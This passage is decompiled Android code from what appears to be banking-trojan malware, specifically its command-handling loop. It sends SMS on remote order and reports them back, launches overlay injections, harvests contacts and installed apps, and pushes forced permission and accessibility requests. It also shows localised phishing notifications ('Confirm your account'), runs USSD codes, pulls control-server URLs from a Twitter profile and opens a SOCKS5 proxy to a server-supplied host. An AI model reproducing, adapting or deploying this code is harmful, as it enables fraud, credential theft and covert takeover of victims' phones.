            r3 = r3[r4]     // Catch:{ Exception -> 0x0629 }
            r7.append(r3)     // Catch:{ Exception -> 0x0629 }
            java.lang.String r3 = r7.toString()     // Catch:{ Exception -> 0x0629 }
            r5.mo233d(r1, r6, r3)     // Catch:{ Exception -> 0x0629 }
            r3 = 1
            goto L_0x05db
        L_0x05d7:
            int r4 = r4 + 1
            goto L_0x058e
        L_0x05da:
            r3 = 0
        L_0x05db:
            java.lang.String r4 = "Twit"
            java.lang.StringBuilder r5 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x0629 }
            r5.<init>()     // Catch:{ Exception -> 0x0629 }
            java.lang.String r6 = ""
            r5.append(r6)     // Catch:{ Exception -> 0x0629 }
            r5.append(r3)     // Catch:{ Exception -> 0x0629 }
            java.lang.String r5 = r5.toString()     // Catch:{ Exception -> 0x0629 }
            android.util.Log.e(r4, r5)     // Catch:{ Exception -> 0x0629 }
            if (r3 != 0) goto L_0x0632
            wocwvy.czyxoxmbauu.slsa.b r3 = r1.f571b     // Catch:{ Exception -> 0x0629 }
            java.lang.String r3 = r3.mo217b()     // Catch:{ Exception -> 0x0629 }
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f571b     // Catch:{ Exception -> 0x0629 }
            java.lang.String r5 = "getTwitt"
            java.lang.StringBuilder r6 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x0629 }
            r6.<init>()     // Catch:{ Exception -> 0x0629 }
            java.lang.String r7 = ""
            r6.append(r7)     // Catch:{ Exception -> 0x0629 }
            r6.append(r3)     // Catch:{ Exception -> 0x0629 }
            java.lang.String r6 = r6.toString()     // Catch:{ Exception -> 0x0629 }
            r4.mo213a(r5, r6)     // Catch:{ Exception -> 0x0629 }
            java.lang.String r4 = "https://"
            boolean r4 = r3.contains(r4)     // Catch:{ Exception -> 0x0629 }
            if (r4 != 0) goto L_0x0621
            java.lang.String r4 = "http://"
            boolean r4 = r3.contains(r4)     // Catch:{ Exception -> 0x0629 }
            if (r4 == 0) goto L_0x0632
        L_0x0621:
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f571b     // Catch:{ Exception -> 0x0629 }
            java.lang.String r5 = "urls"
            r4.mo233d(r1, r5, r3)     // Catch:{ Exception -> 0x0629 }
            goto L_0x0632
        L_0x0629:
            wocwvy.czyxoxmbauu.slsa.b r3 = r1.f571b
            java.lang.String r4 = "ERROR"
            java.lang.String r5 = "Class ukhakhcgifofl -> get urls"
        L_0x062f:
            r3.mo213a(r4, r5)
        L_0x0632:
            wocwvy.czyxoxmbauu.slsa.b r3 = r1.f571b
            java.lang.String r4 = "Общие настройки"
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b
            android.content.Context r6 = r1.f573d
            java.lang.String r7 = "SettingsAll"
            java.lang.String r5 = r5.mo234e(r6, r7)
            r3.mo213a(r4, r5)
            java.lang.String r3 = r1.f582m
            java.lang.String r4 = "::"
            java.lang.String[] r3 = r3.split(r4)
            r4 = 0
        L_0x064c:
            int r5 = r3.length
            if (r4 >= r5) goto L_0x105d
            r5 = r3[r4]
            java.lang.String r6 = "|startinj="
            boolean r5 = r5.contains(r6)
            if (r5 == 0) goto L_0x0685
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b
            android.content.Context r6 = r1.f573d
            java.lang.String r7 = "name"
            java.lang.String r5 = r5.mo234e(r6, r7)
            java.lang.String r6 = "true"
            boolean r5 = r5.contains(r6)
            if (r5 != 0) goto L_0x0685
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b
            r6 = r3[r4]
            java.lang.String r7 = "|startinj="
            java.lang.String r8 = "|endstartinj"
            java.lang.String r5 = r5.mo208a(r6, r7, r8)
            wocwvy.czyxoxmbauu.slsa.b r6 = r1.f571b
            java.lang.String r7 = "startinj"
            r6.mo213a(r7, r5)
            wocwvy.czyxoxmbauu.slsa.b r6 = r1.f571b
            java.lang.String r7 = "lock_inj"
            r6.mo233d(r1, r7, r5)
        L_0x0685:
            r5 = r3[r4]
            java.lang.String r6 = "Send_GO_SMS"
            boolean r5 = r5.contains(r6)
            r6 = 10
            if (r5 == 0) goto L_0x0764
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b
            r7 = r3[r4]
            java.lang.String r8 = "|number="
            java.lang.String r9 = "|text="
            java.lang.String r5 = r5.mo208a(r7, r8, r9)
            r7 = r3[r4]
            java.lang.String r8 = "text="
            java.lang.String[] r7 = r7.split(r8)
            wocwvy.czyxoxmbauu.slsa.b r8 = r1.f571b     // Catch:{ Exception -> 0x072a }
            r9 = 1
            r10 = r7[r9]     // Catch:{ Exception -> 0x072a }
            r8.mo228c(r1, r5, r10)     // Catch:{ Exception -> 0x072a }
            wocwvy.czyxoxmbauu.slsa.b r8 = r1.f571b     // Catch:{ Exception -> 0x072a }
            android.content.Context r9 = r1.f573d     // Catch:{ Exception -> 0x072a }
            java.lang.String r10 = "4"
            java.lang.StringBuilder r11 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x072a }
            r11.<init>()     // Catch:{ Exception -> 0x072a }
            java.lang.String r12 = "p="
            r11.append(r12)     // Catch:{ Exception -> 0x072a }
            wocwvy.czyxoxmbauu.slsa.b r12 = r1.f571b     // Catch:{ Exception -> 0x072a }
            java.lang.StringBuilder r13 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x072a }
            r13.<init>()     // Catch:{ Exception -> 0x072a }
            r13.append(r2)     // Catch:{ Exception -> 0x072a }
            java.lang.String r14 = "|Outgoing SMS"
            r13.append(r14)     // Catch:{ Exception -> 0x072a }
            r13.append(r6)     // Catch:{ Exception -> 0x072a }
            java.lang.String r14 = "Number: "
            r13.append(r14)     // Catch:{ Exception -> 0x072a }
            r13.append(r5)     // Catch:{ Exception -> 0x072a }
            r13.append(r6)     // Catch:{ Exception -> 0x072a }
            java.lang.String r14 = "Text: "
            r13.append(r14)     // Catch:{ Exception -> 0x072a }
            r14 = 1
            r15 = r7[r14]     // Catch:{ Exception -> 0x072a }
            r13.append(r15)     // Catch:{ Exception -> 0x072a }
            r13.append(r6)     // Catch:{ Exception -> 0x072a }
            java.lang.String r14 = "|"
            r13.append(r14)     // Catch:{ Exception -> 0x072a }
            java.lang.String r13 = r13.toString()     // Catch:{ Exception -> 0x072a }
            java.lang.String r12 = r12.mo225c(r13)     // Catch:{ Exception -> 0x072a }
            r11.append(r12)     // Catch:{ Exception -> 0x072a }
            java.lang.String r11 = r11.toString()     // Catch:{ Exception -> 0x072a }
            r8.mo218b(r9, r10, r11)     // Catch:{ Exception -> 0x072a }
            wocwvy.czyxoxmbauu.slsa.b r8 = r1.f571b     // Catch:{ Exception -> 0x072a }
            java.lang.String r9 = ""
            java.lang.StringBuilder r10 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x072a }
            r10.<init>()     // Catch:{ Exception -> 0x072a }
            java.lang.String r11 = "Отправляем смс на номер "
            r10.append(r11)     // Catch:{ Exception -> 0x072a }
            r10.append(r5)     // Catch:{ Exception -> 0x072a }
            java.lang.String r5 = " с текстом  "
            r10.append(r5)     // Catch:{ Exception -> 0x072a }
            r5 = 1
            r7 = r7[r5]     // Catch:{ Exception -> 0x072a }
            r10.append(r7)     // Catch:{ Exception -> 0x072a }
            java.lang.String r5 = r10.toString()     // Catch:{ Exception -> 0x072a }
            r8.mo213a(r9, r5)     // Catch:{ Exception -> 0x072a }
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x072a }
            android.content.Context r7 = r1.f573d     // Catch:{ Exception -> 0x072a }
            r5.mo242l(r7)     // Catch:{ Exception -> 0x072a }
            goto L_0x0764
        L_0x072a:
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b
            android.content.Context r7 = r1.f573d
            java.lang.String r8 = "4"
            java.lang.StringBuilder r9 = new java.lang.StringBuilder
            r9.<init>()
            java.lang.String r10 = "p="
            r9.append(r10)
            wocwvy.czyxoxmbauu.slsa.b r10 = r1.f571b
            java.lang.StringBuilder r11 = new java.lang.StringBuilder
            r11.<init>()
            r11.append(r2)
            java.lang.String r12 = "|(Outgoing SMS) Error sending SMS, maybe there are no permission to send!|"
            r11.append(r12)
            java.lang.String r11 = r11.toString()
            java.lang.String r10 = r10.mo225c(r11)
            r9.append(r10)
            java.lang.String r9 = r9.toString()
            r5.mo218b(r7, r8, r9)
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b
            java.lang.String r7 = ""
            java.lang.String r8 = "Error sending SMS, maybe there are no permission to send!"
            r5.mo213a(r7, r8)
        L_0x0764:
            r5 = r3[r4]
            java.lang.String r7 = "nymBePsG0"
            boolean r5 = r5.contains(r7)
            r7 = 1073741824(0x40000000, float:2.0)
            r8 = 268435456(0x10000000, float:2.5243549E-29)
            if (r5 == 0) goto L_0x0792
            android.content.Intent r5 = new android.content.Intent
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.ncec.wami> r9 = wocwvy.czyxoxmbauu.slsa.ncec.wami.class
            r5.<init>(r1, r9)
            java.lang.String r9 = "str"
            java.lang.String r10 = "0"
            android.content.Intent r5 = r5.putExtra(r9, r10)
            java.lang.String r9 = "cwc_text"
            java.lang.String r10 = ""
            android.content.Intent r5 = r5.putExtra(r9, r10)
            r5.addFlags(r8)
            r5.addFlags(r7)
            r1.startActivity(r5)
        L_0x0792:
            r5 = r3[r4]
            java.lang.String r9 = "GetSWSGO"
            boolean r5 = r5.contains(r9)
            if (r5 == 0) goto L_0x07ac
            android.content.Intent r5 = new android.content.Intent
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.ncec.bdxyqqt> r9 = wocwvy.czyxoxmbauu.slsa.ncec.bdxyqqt.class
            r5.<init>(r1, r9)
            r5.addFlags(r8)
            r5.addFlags(r7)
            r1.startActivity(r5)
        L_0x07ac:
            r5 = r3[r4]
            java.lang.String r9 = "|telbookgotext="
            boolean r5 = r5.contains(r9)
            if (r5 == 0) goto L_0x07e0
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b
            r9 = r3[r4]
            java.lang.String r10 = "|telbookgotext="
            java.lang.String r11 = "|endtextbook"
            java.lang.String r5 = r5.mo208a(r9, r10, r11)
            android.content.Intent r9 = new android.content.Intent
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.ncec.wami> r10 = wocwvy.czyxoxmbauu.slsa.ncec.wami.class
            r9.<init>(r1, r10)
            java.lang.String r10 = "str"
            java.lang.String r11 = "1"
            android.content.Intent r9 = r9.putExtra(r10, r11)
            java.lang.String r10 = "cwc_text"
            android.content.Intent r5 = r9.putExtra(r10, r5)
            r5.addFlags(r8)
            r5.addFlags(r7)
            r1.startActivity(r5)
        L_0x07e0:
            r5 = r3[r4]
            java.lang.String r9 = "getapps"
            boolean r5 = r5.contains(r9)
            if (r5 == 0) goto L_0x07ef
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b
            r5.mo227c(r1)
        L_0x07ef:
            r5 = r3[r4]
            java.lang.String r9 = "getpermissions"
            boolean r5 = r5.contains(r9)
            if (r5 == 0) goto L_0x07fe
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b
            r5.mo231d(r1)
        L_0x07fe:
            r5 = r3[r4]
            java.lang.String r9 = "startaccessibility"
            boolean r5 = r5.contains(r9)
            if (r5 == 0) goto L_0x0831
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x0828 }
            java.lang.String r9 = "startRequest"
            java.lang.String r5 = r5.mo234e(r1, r9)     // Catch:{ Exception -> 0x0828 }
            java.lang.String r9 = "Access=0"
            boolean r9 = r5.contains(r9)     // Catch:{ Exception -> 0x0828 }
            if (r9 == 0) goto L_0x0831
            java.lang.String r9 = "Access=0"
            java.lang.String r10 = "Access=1"
            java.lang.String r5 = r5.replace(r9, r10)     // Catch:{ Exception -> 0x0828 }
            wocwvy.czyxoxmbauu.slsa.b r9 = r1.f571b     // Catch:{ Exception -> 0x0828 }
            java.lang.String r10 = "startRequest"
            r9.mo233d(r1, r10, r5)     // Catch:{ Exception -> 0x0828 }
            goto L_0x0831
        L_0x0828:
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b
            java.lang.String r9 = "ukhakhcgifofl"
            java.lang.String r10 = "Access=0"
            r5.mo213a(r9, r10)
        L_0x0831:
            r5 = r3[r4]
            java.lang.String r9 = "startpermission"
            boolean r5 = r5.contains(r9)
            if (r5 == 0) goto L_0x0864
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x085b }
            java.lang.String r9 = "startRequest"
            java.lang.String r5 = r5.mo234e(r1, r9)     // Catch:{ Exception -> 0x085b }
            java.lang.String r9 = "Perm=0"
            boolean r9 = r5.contains(r9)     // Catch:{ Exception -> 0x085b }
            if (r9 == 0) goto L_0x0864
            java.lang.String r9 = "Perm=0"
            java.lang.String r10 = "Perm=1"
            java.lang.String r5 = r5.replace(r9, r10)     // Catch:{ Exception -> 0x085b }
            wocwvy.czyxoxmbauu.slsa.b r9 = r1.f571b     // Catch:{ Exception -> 0x085b }
            java.lang.String r10 = "startRequest"
            r9.mo233d(r1, r10, r5)     // Catch:{ Exception -> 0x085b }
            goto L_0x0864
        L_0x085b:
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b
            java.lang.String r9 = "ukhakhcgifofl"
            java.lang.String r10 = "Perm=0"
            r5.mo213a(r9, r10)
        L_0x0864:
            r5 = r3[r4]
            java.lang.String r9 = "=ALERT|"
            boolean r5 = r5.contains(r9)
            if (r5 == 0) goto L_0x08a1
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b
            r9 = r3[r4]
            java.lang.String r10 = "|title="
            java.lang.String r11 = "|text="
            java.lang.String r5 = r5.mo208a(r9, r10, r11)
            r9 = r3[r4]
            java.lang.String r10 = "text="
            java.lang.String[] r9 = r9.split(r10)
            android.content.Intent r10 = new android.content.Intent     // Catch:{ Exception -> 0x08a1 }
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.ncec.fyqapyahei> r11 = wocwvy.czyxoxmbauu.slsa.ncec.fyqapyahei.class
            r10.<init>(r1, r11)     // Catch:{ Exception -> 0x08a1 }
            java.lang.String r11 = "title"
            android.content.Intent r5 = r10.putExtra(r11, r5)     // Catch:{ Exception -> 0x08a1 }
            java.lang.String r10 = "content"
            r11 = 1
            r9 = r9[r11]     // Catch:{ Exception -> 0x08a1 }
            android.content.Intent r5 = r5.putExtra(r10, r9)     // Catch:{ Exception -> 0x08a1 }
            r5.addFlags(r8)     // Catch:{ Exception -> 0x08a1 }
            r5.addFlags(r7)     // Catch:{ Exception -> 0x08a1 }
            r1.startActivity(r5)     // Catch:{ Exception -> 0x08a1 }
        L_0x08a1:
            r5 = r3[r4]
            java.lang.String r9 = "=PUSH|"
            boolean r5 = r5.contains(r9)
            if (r5 == 0) goto L_0x090c
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x0903 }
            r9 = r3[r4]     // Catch:{ Exception -> 0x0903 }
            java.lang.String r10 = "|title="
            java.lang.String r11 = "|text="
            java.lang.String r5 = r5.mo208a(r9, r10, r11)     // Catch:{ Exception -> 0x0903 }
            wocwvy.czyxoxmbauu.slsa.b r9 = r1.f571b     // Catch:{ Exception -> 0x0903 }
            r10 = r3[r4]     // Catch:{ Exception -> 0x0903 }
            java.lang.String r11 = "|text="
            java.lang.String r12 = "|icon="
            java.lang.String r9 = r9.mo208a(r10, r11, r12)     // Catch:{ Exception -> 0x0903 }
            r10 = r3[r4]     // Catch:{ Exception -> 0x0903 }
            java.lang.String r11 = "icon="
            java.lang.String[] r10 = r10.split(r11)     // Catch:{ Exception -> 0x0903 }
            r11 = 1
            r10 = r10[r11]     // Catch:{ Exception -> 0x0903 }
            wocwvy.czyxoxmbauu.slsa.b r11 = r1.f571b     // Catch:{ Exception -> 0x0903 }
            java.lang.String r12 = "Push Icon"
            java.lang.StringBuilder r13 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x0903 }
            r13.<init>()     // Catch:{ Exception -> 0x0903 }
            java.lang.String r14 = ""
            r13.append(r14)     // Catch:{ Exception -> 0x0903 }
            r13.append(r10)     // Catch:{ Exception -> 0x0903 }
            java.lang.String r13 = r13.toString()     // Catch:{ Exception -> 0x0903 }
            r11.mo213a(r12, r13)     // Catch:{ Exception -> 0x0903 }
            android.content.Intent r11 = new android.content.Intent     // Catch:{ Exception -> 0x0903 }
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.nepgaqmyfrhw> r12 = wocwvy.czyxoxmbauu.slsa.nepgaqmyfrhw.class
            r11.<init>(r1, r12)     // Catch:{ Exception -> 0x0903 }
            java.lang.String r12 = "appname"
            android.content.Intent r10 = r11.putExtra(r12, r10)     // Catch:{ Exception -> 0x0903 }
            java.lang.String r11 = "title"
            android.content.Intent r5 = r10.putExtra(r11, r5)     // Catch:{ Exception -> 0x0903 }
            java.lang.String r10 = "text"
            android.content.Intent r5 = r5.putExtra(r10, r9)     // Catch:{ Exception -> 0x0903 }
            r1.startService(r5)     // Catch:{ Exception -> 0x0903 }
            goto L_0x090c
        L_0x0903:
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b
            java.lang.String r9 = "ukhakhcgifofl"
            java.lang.String r10 = "ERROR -> PUSH"
            r5.mo213a(r9, r10)
        L_0x090c:
            r5 = r3[r4]
            java.lang.String r9 = "startAutoPush"
            boolean r5 = r5.contains(r9)
            if (r5 == 0) goto L_0x09b7
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x09ae }
            r9 = r3[r4]     // Catch:{ Exception -> 0x09ae }
            java.lang.String r10 = "|AppName="
            java.lang.String r11 = "|EndAppName"
            java.lang.String r5 = r5.mo208a(r9, r10, r11)     // Catch:{ Exception -> 0x09ae }
            wocwvy.czyxoxmbauu.slsa.b r9 = r1.f571b     // Catch:{ Exception -> 0x09ae }
            java.lang.String r10 = "APP"
            r9.mo213a(r10, r5)     // Catch:{ Exception -> 0x09ae }
            android.content.res.Resources r9 = android.content.res.Resources.getSystem()     // Catch:{ Exception -> 0x09ae }
            android.content.res.Configuration r9 = r9.getConfiguration()     // Catch:{ Exception -> 0x09ae }
            java.util.Locale r9 = r9.locale     // Catch:{ Exception -> 0x09ae }
            java.lang.String r9 = r9.toString()     // Catch:{ Exception -> 0x09ae }
            java.lang.String r10 = "RU"
            boolean r10 = r9.contains(r10)     // Catch:{ Exception -> 0x09ae }
            if (r10 == 0) goto L_0x0944
            java.lang.String r9 = "Срочное сообщение!"
            java.lang.String r10 = "Подтвердите свой аккаунт"
            goto L_0x0991
        L_0x0944:
            java.lang.String r10 = "US"
            boolean r10 = r9.contains(r10)     // Catch:{ Exception -> 0x09ae }
            if (r10 == 0) goto L_0x0951
        L_0x094c:
            java.lang.String r9 = "Urgent message!"
            java.lang.String r10 = "Confirm your account"
            goto L_0x0991
        L_0x0951:
            java.lang.String r10 = "TR"
            boolean r10 = r9.contains(r10)     // Catch:{ Exception -> 0x09ae }
            if (r10 == 0) goto L_0x095e
            java.lang.String r9 = "Acil mesaj!"
            java.lang.String r10 = "Hesabını onayla"
            goto L_0x0991
        L_0x095e:
            java.lang.String r10 = "DE"
            boolean r10 = r9.contains(r10)     // Catch:{ Exception -> 0x09ae }
            if (r10 == 0) goto L_0x096b
            java.lang.String r9 = "Dringende Nachricht!"
            java.lang.String r10 = "Bestätigen Sie ihr Konto"
            goto L_0x0991
        L_0x096b:
            java.lang.String r10 = "IT"
            boolean r10 = r9.contains(r10)     // Catch:{ Exception -> 0x09ae }
            if (r10 == 0) goto L_0x0978
            java.lang.String r9 = "Messaggio urgente!"
            java.lang.String r10 = "Conferma il tuo account"
            goto L_0x0991
        L_0x0978:
            java.lang.String r10 = "FR"
            boolean r10 = r9.contains(r10)     // Catch:{ Exception -> 0x09ae }
            if (r10 == 0) goto L_0x0985
            java.lang.String r9 = "Message urgent!"
            java.lang.String r10 = "Confirmez votre compte"
            goto L_0x0991
        L_0x0985:
            java.lang.String r10 = "UA"
            boolean r9 = r9.contains(r10)     // Catch:{ Exception -> 0x09ae }
            if (r9 == 0) goto L_0x094c
            java.lang.String r9 = "Термінове повідомлення!"
            java.lang.String r10 = "Підтвердьте свій рахунок"
        L_0x0991:
            android.content.Intent r11 = new android.content.Intent     // Catch:{ Exception -> 0x09ae }
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.nepgaqmyfrhw> r12 = wocwvy.czyxoxmbauu.slsa.nepgaqmyfrhw.class
            r11.<init>(r1, r12)     // Catch:{ Exception -> 0x09ae }
            java.lang.String r12 = "appname"
            android.content.Intent r5 = r11.putExtra(r12, r5)     // Catch:{ Exception -> 0x09ae }
            java.lang.String r11 = "title"
            android.content.Intent r5 = r5.putExtra(r11, r9)     // Catch:{ Exception -> 0x09ae }
            java.lang.String r9 = "text"
            android.content.Intent r5 = r5.putExtra(r9, r10)     // Catch:{ Exception -> 0x09ae }
            r1.startService(r5)     // Catch:{ Exception -> 0x09ae }
            goto L_0x09b7
        L_0x09ae:
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b
            java.lang.String r9 = "ukhakhcgifofl"
            java.lang.String r10 = "ERROR -> startAutoPush"
            r5.mo213a(r9, r10)
        L_0x09b7:
            r5 = r3[r4]
            java.lang.String r9 = "RequestPermissionInj"
            boolean r5 = r5.contains(r9)
            if (r5 == 0) goto L_0x09f3
            int r5 = android.os.Build.VERSION.SDK_INT
            r9 = 24
            if (r5 < r9) goto L_0x09f5
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b
            android.content.Context r10 = r1.f573d
            boolean r5 = r5.mo238h(r10)
            if (r5 != 0) goto L_0x09f5
            android.content.Intent r5 = new android.content.Intent
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.ncec.dzudmx> r10 = wocwvy.czyxoxmbauu.slsa.ncec.dzudmx.class
            r5.<init>(r1, r10)
            java.lang.String r10 = "start"
            java.lang.String r11 = "statistic"
            android.content.Intent r5 = r5.putExtra(r10, r11)
            r5.addFlags(r8)
            r5.addFlags(r7)
            r1.startActivity(r5)
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b
            java.lang.String r10 = "Вып настр"
            java.lang.String r11 = "/PROC 7.0 "
            r5.mo213a(r10, r11)
            goto L_0x09f5
        L_0x09f3:
            r9 = 24
        L_0x09f5:
            r5 = r3[r4]
            java.lang.String r10 = "RequestPermissionGPS"
            boolean r5 = r5.contains(r10)
            if (r5 == 0) goto L_0x0a2a
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b
            android.content.Context r10 = r1.f573d
            boolean r5 = r5.mo241k(r10)
            if (r5 != 0) goto L_0x0a2a
            android.content.Intent r5 = new android.content.Intent
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.ncec.dzudmx> r10 = wocwvy.czyxoxmbauu.slsa.ncec.dzudmx.class
            r5.<init>(r1, r10)
            java.lang.String r10 = "start"
            java.lang.String r11 = "gps"
            android.content.Intent r5 = r5.putExtra(r10, r11)
            r5.addFlags(r8)
            r5.addFlags(r7)
            r1.startActivity(r5)
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b
            java.lang.String r10 = "Вып настр"
            java.lang.String r11 = "Запрос геолокации"
            r5.mo213a(r10, r11)
        L_0x0a2a:
            r5 = r3[r4]
            java.lang.String r10 = "|ussd="
            boolean r5 = r5.contains(r10)
            if (r5 == 0) goto L_0x0a67
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x0a5e }
            r10 = r3[r4]     // Catch:{ Exception -> 0x0a5e }
            java.lang.String r11 = "|ussd="
            java.lang.String r12 = "|endUssD"
            java.lang.String r5 = r5.mo208a(r10, r11, r12)     // Catch:{ Exception -> 0x0a5e }
            wocwvy.czyxoxmbauu.slsa.b r10 = r1.f571b     // Catch:{ Exception -> 0x0a5e }
            java.lang.String r11 = "USSD"
            r10.mo213a(r11, r5)     // Catch:{ Exception -> 0x0a5e }
            android.content.Intent r10 = new android.content.Intent     // Catch:{ Exception -> 0x0a5e }
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.ncec.gcmysyhtova> r11 = wocwvy.czyxoxmbauu.slsa.ncec.gcmysyhtova.class
            r10.<init>(r1, r11)     // Catch:{ Exception -> 0x0a5e }
            java.lang.String r11 = "str"
            android.content.Intent r5 = r10.putExtra(r11, r5)     // Catch:{ Exception -> 0x0a5e }
            r5.addFlags(r8)     // Catch:{ Exception -> 0x0a5e }
            r5.addFlags(r7)     // Catch:{ Exception -> 0x0a5e }
            r1.startActivity(r5)     // Catch:{ Exception -> 0x0a5e }
            goto L_0x0a67
        L_0x0a5e:
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b
            java.lang.String r10 = "ERROR"
            java.lang.String r11 = "USSD -> Commands"
            r5.mo213a(r10, r11)
        L_0x0a67:
            r5 = r3[r4]
            java.lang.String r10 = "|sockshost="
            boolean r5 = r5.contains(r10)
            if (r5 == 0) goto L_0x0b11
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x0b08 }
            r10 = r3[r4]     // Catch:{ Exception -> 0x0b08 }
            java.lang.String r11 = "|sockshost="
            java.lang.String r12 = "|user="
            java.lang.String r5 = r5.mo208a(r10, r11, r12)     // Catch:{ Exception -> 0x0b08 }
            wocwvy.czyxoxmbauu.slsa.b r10 = r1.f571b     // Catch:{ Exception -> 0x0b08 }
            r11 = r3[r4]     // Catch:{ Exception -> 0x0b08 }
            java.lang.String r12 = "|user="
            java.lang.String r13 = "|pass="
            java.lang.String r10 = r10.mo208a(r11, r12, r13)     // Catch:{ Exception -> 0x0b08 }
            wocwvy.czyxoxmbauu.slsa.b r11 = r1.f571b     // Catch:{ Exception -> 0x0b08 }
            r12 = r3[r4]     // Catch:{ Exception -> 0x0b08 }
            java.lang.String r13 = "|pass="
            java.lang.String r14 = "|port="
            java.lang.String r11 = r11.mo208a(r12, r13, r14)     // Catch:{ Exception -> 0x0b08 }
            wocwvy.czyxoxmbauu.slsa.b r12 = r1.f571b     // Catch:{ Exception -> 0x0b08 }
            r13 = r3[r4]     // Catch:{ Exception -> 0x0b08 }
            java.lang.String r14 = "|port="
            java.lang.String r15 = "|endssh"
            java.lang.String r12 = r12.mo208a(r13, r14, r15)     // Catch:{ Exception -> 0x0b08 }
            android.content.Intent r13 = new android.content.Intent     // Catch:{ Exception -> 0x0b08 }
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.kuv.sfswwunyakpjr> r14 = wocwvy.czyxoxmbauu.slsa.kuv.sfswwunyakpjr.class
            r13.<init>(r1, r14)     // Catch:{ Exception -> 0x0b08 }
            java.lang.String r14 = "host"
            java.lang.StringBuilder r15 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x0b08 }
            r15.<init>()     // Catch:{ Exception -> 0x0b08 }
            java.lang.String r9 = ""
            r15.append(r9)     // Catch:{ Exception -> 0x0b08 }
            r15.append(r5)     // Catch:{ Exception -> 0x0b08 }
            java.lang.String r5 = r15.toString()     // Catch:{ Exception -> 0x0b08 }
            android.content.Intent r5 = r13.putExtra(r14, r5)     // Catch:{ Exception -> 0x0b08 }
            java.lang.String r9 = "user"
            java.lang.StringBuilder r13 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x0b08 }
            r13.<init>()     // Catch:{ Exception -> 0x0b08 }
            java.lang.String r14 = ""
            r13.append(r14)     // Catch:{ Exception -> 0x0b08 }
            r13.append(r10)     // Catch:{ Exception -> 0x0b08 }
            java.lang.String r10 = r13.toString()     // Catch:{ Exception -> 0x0b08 }
            android.content.Intent r5 = r5.putExtra(r9, r10)     // Catch:{ Exception -> 0x0b08 }
            java.lang.String r9 = "pass"
            java.lang.StringBuilder r10 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x0b08 }
            r10.<init>()     // Catch:{ Exception -> 0x0b08 }
            java.lang.String r13 = ""
            r10.append(r13)     // Catch:{ Exception -> 0x0b08 }
            r10.append(r11)     // Catch:{ Exception -> 0x0b08 }
            java.lang.String r10 = r10.toString()     // Catch:{ Exception -> 0x0b08 }
            android.content.Intent r5 = r5.putExtra(r9, r10)     // Catch:{ Exception -> 0x0b08 }
            java.lang.String r9 = "port"
            java.lang.StringBuilder r10 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x0b08 }
            r10.<init>()     // Catch:{ Exception -> 0x0b08 }
            java.lang.String r11 = ""
            r10.append(r11)     // Catch:{ Exception -> 0x0b08 }
            r10.append(r12)     // Catch:{ Exception -> 0x0b08 }
            java.lang.String r10 = r10.toString()     // Catch:{ Exception -> 0x0b08 }
            android.content.Intent r5 = r5.putExtra(r9, r10)     // Catch:{ Exception -> 0x0b08 }
            r1.startService(r5)     // Catch:{ Exception -> 0x0b08 }
            goto L_0x0b11
        L_0x0b08:
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b
            java.lang.String r9 = "ERROR"
            java.lang.String r10 = "Socks5 -> Commands"
            r5.mo213a(r9, r10)
        L_0x0b11:
            r5 = r3[r4]
            java.lang.String r9 = "stopsocks5"
            boolean r5 = r5.contains(r9)
            if (r5 == 0) goto L_0x0b2e
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x0b25 }
            java.lang.String r9 = "socks"
            java.lang.String r10 = "stop"
            r5.mo233d(r1, r9, r10)     // Catch:{ Exception -> 0x0b25 }
            goto L_0x0b2e
        L_0x0b25:
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b
            java.lang.String r9 = "ERROR"
            java.lang.String r10 = "stop Socks5 -> Commands"
            r5.mo213a(r9, r10)
